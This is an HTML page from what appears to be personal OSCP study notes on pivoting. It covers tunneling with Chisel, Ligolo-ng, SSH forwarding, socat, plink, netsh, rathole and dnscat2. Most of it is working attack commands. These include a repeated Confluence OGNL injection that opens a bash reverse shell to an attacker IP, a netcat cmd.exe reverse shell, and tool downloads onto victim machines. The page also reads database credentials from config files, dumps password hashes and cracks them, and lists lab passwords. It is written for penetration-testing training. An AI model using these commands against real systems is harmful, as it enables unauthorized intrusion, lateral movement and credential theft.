@@ -1,0 +1,627 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Pivoting - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">1.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">1.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">1.3.</strong> File Transfer</a></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">1.4.</strong> Ports</a></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">1.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">2.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.2.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">2.3.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">2.3.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">2.3.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">2.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">2.5.</strong> File Uploads</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">2.5.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">2.5.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">2.5.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">2.6.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">2.7.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">2.8.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">2.9.</strong> SQL</a></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">2.10.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">2.11.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">2.12.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">3.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">5.1.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">5.2.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">5.3.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html" class="active"><strong aria-hidden="true">5.4.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">5.5.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">5.6.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">5.7.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="pivoting"><a class="header" href="#pivoting">Pivoting</a></h1>
+<p>A very Interesting and important concept - (Chisel + Proxychain)</p>
+<h3 id="links"><a class="header" href="#links">Links</a></h3>
+<ul>
+<li><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a></li>
+<li><a href="https://github.com/jpillora/chisel">Chisel</a></li>
+<li><a href="https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6">SSH Tunneling Explained</a></li>
+</ul>
+<h3 id="remote-port-forwarding-opening-an-internal-port-to-us"><a class="header" href="#remote-port-forwarding-opening-an-internal-port-to-us">Remote Port Forwarding (Opening an Internal port to us)</a></h3>
+<pre><code>Transfer chisel to Victim
+# Proxychains # In end, append 'socks5 127.0.0.1 1080' in end of file.
+# For HTML you will have to append 'html 127.0.0.1 1080' at the end of the file.
+nano /etc/proxychains4.conf
+
+# On Victim # Only Change Kali IP and port 445 as a port you want to open up.
+./chisel.exe client &lt;KALI IP&gt;:1337 R:1080:127.0.0.1:&lt;445&gt;
+
+# To run above in background # change location of chisel.exe, and 80 to desired port
+powershell.exe
+$scriptBlock = { Start-Process C:\Users\viewer\Desktop\chisel.exe -ArgumentList @('client','&lt;ATTACKERs IP&gt;:1337','R:127.0.0.1:80:&lt;Vitctim IP&gt;:80') }
+Start-Job -ScriptBlock $scriptBlock
+
+# On Attacking # All values Static here
+./chisel server -p 1337 --reverse &amp;
+
+-&gt; Use 127.0.0.1 and Port 1080 for Scanning and further enumeration.
+</code></pre>
+<h3 id="reverse-socks-proxy-pivoting-to-other-network"><a class="header" href="#reverse-socks-proxy-pivoting-to-other-network">Reverse Socks Proxy (Pivoting to Other Network)</a></h3>
+<pre><code>Transfer Chisel to the Victim machine
+./chisel client &lt;KALI IP&gt;:1337 R:socks &amp;
+# On Victim but Without losing shell 
+$scriptBlock = { Start-Process C:\users\public\chisel.exe -ArgumentList @('client','&lt;ATTACKERs IP&gt;:1337','R:1080:socks') }
+Start-Job -ScriptBlock $scriptBlock
+
+# ON Attacking
+./chisel server -p 1337 --reverse --socks5 # without background job
+./chisel server -p 1337 --reverse --socks5 &amp; # Use this when using proxychain
+# Start enumerating using proxychains nmap &lt;IP&gt;, etc commands.
+
+Now for other networks try:
+proxychains nmap, proxychains psexec, proxychains dirbuster, etc
+try everything just with proxychains command once you get access to another network
+</code></pre>
+<h3 id="more-chisel-notes"><a class="header" href="#more-chisel-notes">More Chisel Notes</a></h3>
+<pre><code># On Kali
+./chisel server -p 8001 --reverse --socks5
+
+# For standard socks proxy
+.\chisel_1.9.1_windows_amd64.exe client 192.168.45.164:8001 R:socks
+
+# For reverse shell
+.\chisel_1.9.1_windows_amd64.exe client 192.168.45.164:8001 0.0.0.0:9999:192.168.45.164:9999
+
+
+#Random Variations
+./chisel client 192.168.45.225:8001 R:socks
+
+0.0.0.0:8000:192.168.45.225:8000
+
+./chisel server -p 8000 --reverse
+
+./chiselwin.exe client 192.168.45.219:8000 R:8001:127.0.0.1:9001
+./chiselwin.exe server -p 9001 --socks5
+
+./chisel client localhost:8001 socks
+
+</code></pre>
+<h3 id="ligolo-ng"><a class="header" href="#ligolo-ng">Ligolo-ng</a></h3>
+<pre><code> iwr -uri http://192.168.45.219:9090/nmap-7.94-setup.exe -Outfile nmap-7.94-setup.exe
+
+iwr -uri http://192.168.45.219:9090/agent.exe -Outfile agent.exe
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+
+./proxy -selfcert  
+
+
+.\agent.exe -connect 192.168.45.219:11601 -ignore-cert
+
+session
+1
+ifconfig
+sudo ip route add 172.16.105.0/24 dev ligolo
+
+tunnel_start
+</code></pre>
+<h2 id="sshuttle"><a class="header" href="#sshuttle">SShuttle</a></h2>
+<pre><code>
+socat TCP-LISTEN:2222,fork TCP:10.4.229.215:22
+sshuttle -r database_admin@192.168.229.63:2222 10.4.229.0/24 172.16.229.0/24
+smbclient -L //172.16.229.217/ -U hr_admin --password=Welcome1234
+
+
+</code></pre>
+<h2 id="windows-ssh"><a class="header" href="#windows-ssh">Windows SSH</a></h2>
+<pre><code>
+sudo systemctl start ssh
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.229.64
+where ssh
+ssh.exe -V
+ssh -N -R 9998 kali@192.168.45.226
+ss -ntplu
+tail /etc/proxychains4.conf
+socks5 127.0.0.1 9998
+
+proxychains psql -h 10.4.50.215 -U postgres
+\l
+</code></pre>
+<h2 id="socat"><a class="header" href="#socat">Socat</a></h2>
+<pre><code>
+curl http://192.168.232.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.239/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+ip addr
+ip route
+cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+D@t4basePassw0rd!
+dbc:postgresql://10.4.232.215:5432/confluence
+postgres
+
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.232.215:5432
+psql -h 192.168.232.63 -p 2345 -U postgres
+\l
+\c confluence
+select * from cwd_user;
+hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
+
+hr_admin = Welcome1234
+rdp_admin = P@ssw0rd!
+database_admin = sqlpass123
+
+socat TCP-LISTEN:2222,fork TCP:10.4.232.215:22
+ssh database_admin@192.168.232.63 -p2222
+
+</code></pre>
+<h2 id="ssh-local-port-forwarding"><a class="header" href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></h2>
+<pre><code>
+curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ssh database_admin@10.4.210.215
+sqlpass123
+ip addr
+ip route
+for i in $(seq 1 254); do nc -zv -w 1 172.16.210.$i 445; done
+
+ssh -N -L 0.0.0.0:4455:172.16.210.217:4242 database_admin@10.4.210.215
+
+
+curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4455%200%3E%261%27%29.start%28%29%22%29%7D/
+
+ss -ntplu
+
+smbclient -p 4455 -L //192.168.210.63/ -U hr_admin --password=Welcome1234
+smbclient -p 4455 //192.168.210.63/scripts -U hr_admin --password=Welcome1234
+get Provisioning.ps1
+
+</code></pre>
+<h2 id="ssh-dynamic-port-forwarding"><a class="header" href="#ssh-dynamic-port-forwarding">SSH Dynamic Port Forwarding</a></h2>
+<pre><code>
+curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.210.215
+sqlpass123
+
+tail /etc/proxychains4.conf
+tail /etc/proxychains.conf
+socks5 192.168.50.63 9999
+
+proxychains smbclient -L //172.16.210.217/ -U hr_admin --password=Welcome1234
+proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.210.217
+proxychains nmap -vvv -sT -p4800-4900 -Pn 172.16.210.217
+
+By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
+
+</code></pre>
+<h2 id="ssh-remote-port-forwarding"><a class="header" href="#ssh-remote-port-forwarding">SSH Remote Port Forwarding</a></h2>
+<pre><code>
+sudo systemctl start ssh
+sudo ss -ntplu
+
+curl http://192.168.229.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.164/4455%200%3E%261%27%29.start%28%29%22%29%7D/
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -R 127.0.0.1:4444:10.4.229.215:4444 kali@192.168.45.164
+ss -ntplu
+psql -h 127.0.0.1 -p 2345 -U postgres
+\l
+
+To close socket listening:
+netstat -np
+lsof -np $pid
+gdb -p $pid
+call close($fileDescriptor) //does not need ; at end.
+quit
+
+
+</code></pre>
+<h2 id="ssh-remote-dynamic-port-forwarding"><a class="header" href="#ssh-remote-dynamic-port-forwarding">SSH Remote Dynamic Port Forwarding</a></h2>
+<pre><code>
+curl http://192.168.229.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.222/4455%200%3E%261%27%29.start%28%29%22%29%7D/
+
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -R 9998 kali@192.168.45.164
+sudo ss -ntplu
+tail /etc/proxychains4.conf
+tail /etc/proxychains.conf
+socks5 127.0.0.1 9998
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.229.64
+proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.229.64
+proxychains ./ssh_remote_dynamic_client -i 10.4.229.64 -p 9062
+
+
+
+
+ssh -R 1080 kali@192.168.45.196
+
+
+</code></pre>
+<p><img src="SSHDynamicReversePortForward.png" alt="SSH Dynamic Reverse Port Forward Example" /></p>
+<p><img src="SSHPortForward.png" alt="SSH Port Forward Example" /></p>
+<h2 id="plink"><a class="header" href="#plink">Plink</a></h2>
+<pre><code>
+sudo systemctl start apache2
+find / -name nc.exe 2&gt;/dev/null
+sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+
+powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
+nc -nvlp 4446
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
+
+find / -name plink.exe 2&gt;/dev/null
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+
+
+C:\Windows\Temp\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+
+ss -ntplu
+
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+
+</code></pre>
+<h2 id="netsh"><a class="header" href="#netsh">Netsh</a></h2>
+<pre><code>
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.208.64
+
+netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.208.64 connectport=4545 connectaddress=10.4.208.215
+
+netstat -anp TCP | find "4545"
+netsh interface portproxy show all
+sudo nmap -sS 192.168.208.64 -Pn -n -4545
+
+netsh advfirewall firewall add rule name="port_forward_ssh_4545" protocol=TCP dir=in localip=192.168.208.64 localport=4545 action=allow
+
+sudo nmap -sS 192.168.208.64 -Pn -n -p4545
+
+ssh database_admin@192.168.208.64 -p4545
+
+database_admin = sqlpass123
+
+
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.208.64
+
+./netsh_exercise_client.bin -i 192.168.208.64 -p 4545
+
+
+</code></pre>
+<h2 id="bore"><a class="header" href="#bore">Bore</a></h2>
+<pre><code>rathole
+
+If you want to reverse shell, need two of these bad boys.
+
+First:
+
+Run rathole server on victim machine:
+
+./rathole server.toml
+
+######################
+# server.toml
+[server]
+bind_addr = "0.0.0.0:2333" # `2333` specifies the port that rathole listens for clients
+
+[server.services.my_nas_ssh]
+token = "123" # Token that is used to authenticate the client for the service. Change to a arbitrary v&gt;
+bind_addr = "0.0.0.0:5000" # `5202` specifies the port that exposes `my_nas_ssh` to the Internet
+
+######################
+then run client on kali:
+
+######################
+./rathole client.toml
+
+######################
+# client.toml
+[client]
+remote_addr = "192.168.216.246:2333" # The address of the server. The port must be the same with the po&gt;
+
+[client.services.my_nas_ssh]
+token = "123" # Must be the same with the server to pass the validation
+local_addr = "127.0.0.1:4444" # The address of the service that needs to be forwarded
+
+######################
+
+Then, for example if you need to forward a port 8000 from victim to get to internal port, flip it.
+
+######################
+
+So, run server on kali:
+
+######################
+
+./rathole server.toml
+
+
+bind_addr = "0.0.0.0:2334" # `2333` specifies the port that rathole listens for cl&gt;
+
+[server.services.my_nas_ssh]
+token = "123" # Token that is used to authenticate the client for the service. Cha&gt;
+bind_addr = "0.0.0.0:8000" # `5202` specifies the port that exposes `my_nas_ssh`
+
+######################
+Then run client on victim:
+
+./rathole client.toml
+
+# client.toml
+[client]
+remote_addr = "192.168.45.219:2334" # The address of the server. The port must be the same with the port in `server.bind_a&gt;
+
+[client.services.my_nas_ssh]
+token = "123" # Must be the same with the server to pass the validation
+local_addr = "127.0.0.1:8000" # The address of the service that needs to be forwarded
+
+
+
+
+</code></pre>
+<h2 id="dns"><a class="header" href="#dns">DNS</a></h2>
+<pre><code>
+cd dns_tunneling
+cat dnsmasq.conf
+sudo dnsmasq -C dnsmasq.conf -d
+sudo tcpdump -i ens192 udp port 53
+
+
+resolvectl status
+nslookup exfiltrated-data.feline.corp
+
+cat dnsmasq_txt.conf
+sudo dnsmasq -C dnsmasq_txt.conf -d
+nslookup -type=txt www.feline.corp
+
+nslookup -type=txt give-me.cat-facts.internal
+
+
+dnscat2
+---
+sudo tcpdump -i ens192 udp port 53
+dnscat2-server feline.corp
+cd dnscat/
+./dnscat feline.corp
+dnscat2-server feline.corp
+windows
+window -i 1
+?
+listen --help
+
+
+listen 127.0.0.1:4455 172.16.2.11:445
+smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+
+listen 0.0.0.0:4646 172.16.229.217:4646
+./dnscat_exercise_client -i 192.168.229.7 -p 4646
+
+
+
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="ADAuth.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="ADLateralMovement.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="ADAuth.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="ADLateralMovement.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
